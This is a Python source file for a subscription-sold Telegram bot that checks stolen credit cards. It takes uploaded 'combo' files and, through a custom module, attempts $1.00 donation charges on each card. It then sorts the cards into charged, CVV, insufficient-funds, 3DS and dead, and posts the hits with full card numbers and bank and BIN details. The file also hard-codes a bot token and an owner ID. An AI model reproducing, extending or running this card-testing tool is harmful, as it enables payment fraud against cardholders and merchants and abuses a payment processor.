import requests
import telebot, time
import os
import json
from datetime import datetime
from gatet import Tele  # Assuming this is your custom module

token = '8265390366:AAEgq3odd3iH6YecaaQ4ADojmKsxKFar03A'
bot = telebot.TeleBot(token, parse_mode="HTML")

# Admin ID - ဒါက owner ID
OWNER_ID = '1318826936'

# User database file
USER_DB_FILE = 'allowed_users.json'

# Load allowed users from file
def load_allowed_users():
    try:
        if os.path.exists(USER_DB_FILE):
            with open(USER_DB_FILE, 'r') as f:
                return json.load(f)
        return {}
    except:
        return {}

# Save allowed users to file
def save_allowed_users(users_dict):
    try:
        with open(USER_DB_FILE, 'w') as f:
            json.dump(users_dict, f, indent=4)
        return True
    except:
        return False

# Check if user is allowed
def is_user_allowed(user_id):
    allowed_users = load_allowed_users()
    return str(user_id) in allowed_users or str(user_id) == OWNER_ID

# Add new user
def add_allowed_user(user_id, username=None, added_by=None):
    allowed_users = load_allowed_users()
    user_id_str = str(user_id)
    
    if user_id_str not in allowed_users:
        allowed_users[user_id_str] = {
            'username': username,
            'added_by': added_by,
            'added_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'is_active': True
        }
        save_allowed_users(allowed_users)
        return True
    return False

# Remove user
def remove_allowed_user(user_id):
    allowed_users = load_allowed_users()
    user_id_str = str(user_id)
    
    if user_id_str in allowed_users and user_id_str != OWNER_ID:
        del allowed_users[user_id_str]
        save_allowed_users(allowed_users)
        return True
    return False

# Admin commands
@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    
    if user_id == OWNER_ID:
        # Owner menu
        bot.reply_to(message, "👑 Owner Menu:\n\n"
                             "/adduser - Add new user\n"
                             "/removeuser - Remove user\n"
                             "/listusers - List all users\n"
                             "/stats - Check bot statistics\n\n"
                             "Send combo file to start checking")
    elif is_user_allowed(user_id):
        # Allowed user
        bot.reply_to(message, "✅ Welcome!\n\n"
                             "You can use this bot to check credit cards.\n\n"
                             "Send me a combo file (txt format) with credit card details.")
    else:
        # Not allowed user
        bot.reply_to(message, "❌ You are not authorized to use this bot.\n\n"
                             "Contact @iwillgoforwardsalone to purchase a subscription.")

# Add user command (Owner only)
@bot.message_handler(commands=["adduser"])
def add_user(message):
    user_id = str(message.from_user.id)
    
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ This command is for owner only!")
        return
    
    try:
        # Check if replying to a message or has arguments
        if message.reply_to_message:
            target_id = str(message.reply_to_message.from_user.id)
            target_username = message.reply_to_message.from_user.username
        else:
            args = message.text.split()
            if len(args) < 2:
                bot.reply_to(message, "Usage: /adduser <user_id> or reply to user's message")
                return
            target_id = args[1]
            target_username = None
        
        # Add user
        if add_allowed_user(target_id, target_username, f"Owner ({user_id})"):
            bot.reply_to(message, f"✅ User {target_id} has been added successfully!")
        else:
            bot.reply_to(message, f"⚠️ User {target_id} is already in the list!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Remove user command (Owner only)
@bot.message_handler(commands=["removeuser"])
def remove_user(message):
    user_id = str(message.from_user.id)
    
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ This command is for owner only!")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /removeuser <user_id>")
            return
        
        target_id = args[1]
        
        if target_id == OWNER_ID:
            bot.reply_to(message, "❌ Cannot remove owner!")
            return
        
        if remove_allowed_user(target_id):
            bot.reply_to(message, f"✅ User {target_id} has been removed!")
        else:
            bot.reply_to(message, f"⚠️ User {target_id} not found in the list!")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# List users command (Owner only)
@bot.message_handler(commands=["listusers"])
def list_users(message):
    user_id = str(message.from_user.id)
    
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ This command is for owner only!")
        return
    
    allowed_users = load_allowed_users()
    
    if not allowed_users:
        bot.reply_to(message, "📭 No users in the list (except owner)")
        return
    
    user_list = "👥 Allowed Users:\n\n"
    user_list += f"👑 Owner: {OWNER_ID}\n\n"
    
    for uid, info in allowed_users.items():
        username = info.get('username', 'N/A')
        added_by = info.get('added_by', 'N/A')
        added_date = info.get('added_date', 'N/A')
        
        user_list += f"🆔 ID: {uid}\n"
        user_list += f"👤 Username: @{username}\n"
        user_list += f"📅 Added: {added_date}\n"
        user_list += f"👨‍💼 By: {added_by}\n"
        user_list += "─" * 20 + "\n"
    
    bot.reply_to(message, user_list)

# Stats command
@bot.message_handler(commands=["stats"])
def stats_command(message):
    user_id = str(message.from_user.id)
    
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ This command is for owner only!")
        return
    
    allowed_users = load_allowed_users()
    total_users = len(allowed_users)
    
    stats_text = f"📊 Bot Statistics\n\n"
    stats_text += f"👑 Owner: {OWNER_ID}\n"
    stats_text += f"👥 Total Allowed Users: {total_users}\n"
    stats_text += f"🤖 Bot Status: Running ✅\n"
    stats_text += f"📅 Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    bot.reply_to(message, stats_text)

# Document handler - Updated with user check
@bot.message_handler(content_types=["document"])
def main(message):
    user_id = str(message.from_user.id)
    
    # Check if user is allowed
    if not is_user_allowed(user_id):
        bot.reply_to(message, "❌ You are not authorized to use this bot.\n\n"
                             "Contact @iwillgoforwardsalone to purchase a subscription.")
        return
    
    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0
    
    # Get username for logging
    username = message.from_user.username
    if username:
        user_info = f"@{username} ({user_id})"
    else:
        user_info = f"User {user_id}"
    
    ko = (bot.reply_to(message, f"CHECKING....⌛\nUser: {user_info}").message_id)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    
    with open("combo.txt", "wb") as w:
        w.write(ee)
    
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            processed = 0
            
            for cc in lino:
                cc = cc.strip()
                if not cc:
                    continue
                
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(
                            chat_id=message.chat.id, 
                            message_id=ko, 
                            text=f'STOP ✅\nChecked by: {user_info}\nBOT BY ➜ @iwillgoforwardsalone'
                        )
                        if os.path.exists('stop.stop'):
                            os.remove('stop.stop')
                        return
                
                # Get bin info
                bin_info = "Unknown"
                card_type = "Unknown"
                brand = "Unknown"
                country = "Unknown"
                country_flag = "Unknown"
                bank = "Unknown"
                
                try: 
                    data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                    brand = data.get('brand', 'Unknown')
                    card_type = data.get('type', 'Unknown')
                    country = data.get('country_name', 'Unknown')
                    country_flag = data.get('country_flag', 'Unknown')
                    bank = data.get('bank', 'Unknown')
                except: 
                    pass
                
                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    last = 'missing payment form'
                
                processed += 1
                progress_msg = f'''[ϟ] ᴘʀᴏᴄᴇꜱꜱɪɴɢ : {processed}/{total}
ϟ ᴄᴜʀʀᴇɴᴛ : {cc}
[ϟ] ꜱᴛᴀᴛᴜꜱ : {last}
ϟ ʜɪᴛ : {ch}
[ϟ] ᴄᴄɴ : {ccn} | ᴄᴠᴠ : {cvv}
[ϟ] ɪɴꜱᴜ : {lowfund} | ᴅᴇᴀᴅ : {dd}

ϟ ʙᴏᴛ ʙʏ: @iwillgoforwardsalone'''
                
                bot.edit_message_text(
                    chat_id=message.chat.id, 
                    message_id=ko, 
                    text=progress_msg
                )
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                print(f"User {user_info} - {last}")
                
                if 'Donation Successful!' in last:
                    ch += 1
                    msg = f''' 
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Hit $1.00 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code>
𝐔𝐬𝐞𝐫: {user_info}
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
                    bot.reply_to(message, msg)
                    
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                    
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    
                elif 'insufficient funds' in last:
                    lowfund += 1
                    msg = f'''            
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Insufficient funds 🔥</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code>
𝐔𝐬𝐞𝐫: {user_info}
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
                    bot.reply_to(message, msg)
                    
                elif 'The payment needs additional action before completion!' in last:
                    cvv += 1
                    msg = f'''            
𝐂𝐀𝐑𝐃: <code>{cc}</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>3ds ✅</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
𝐁𝐚𝐧𝐤: <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>

𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} second</code>
𝐔𝐬𝐞𝐫: {user_info}
𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @iwillgoforwardsalone'''
                    bot.reply_to(message, msg)
                    
                else:
                    dd += 1
                    time.sleep(5)
                    
    except Exception as e:
        print(f"Error: {e}")
        bot.edit_message_text(
            chat_id=message.chat.id, 
            message_id=ko, 
            text=f'Error occurred: {str(e)}\nUser: {user_info}'
        )
        return
    
    # Send final results
    final_msg = f'''✅ CHECK COMPLETED
Checked by: {user_info}

📊 Final Results:
Total: {total}
✅ Charged: {ch}
🔢 CCN: {ccn}
💳 CVV: {cvv}
💰 Low Funds: {lowfund}
❌ Declined: {dd}

⏰ Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
BOT BY ➜ @iwillgoforwardsalone'''
    
    bot.edit_message_text(
        chat_id=message.chat.id, 
        message_id=ko, 
        text=final_msg
    )
    
    # Also send a copy to owner if not owner
    if user_id != OWNER_ID:
        try:
            owner_msg = f'''👤 User Activity Report
User: {user_info}
File Checked: {total} cards
Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

Results:
✅ Charged: {ch}
💰 Low Funds: {lowfund}
💳 3DS/CVV: {cvv}
❌ Declined: {dd}'''
            
            bot.send_message(OWNER_ID, owner_msg)
        except:
            pass

# Stop callback handler (optional)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

bot.polling()
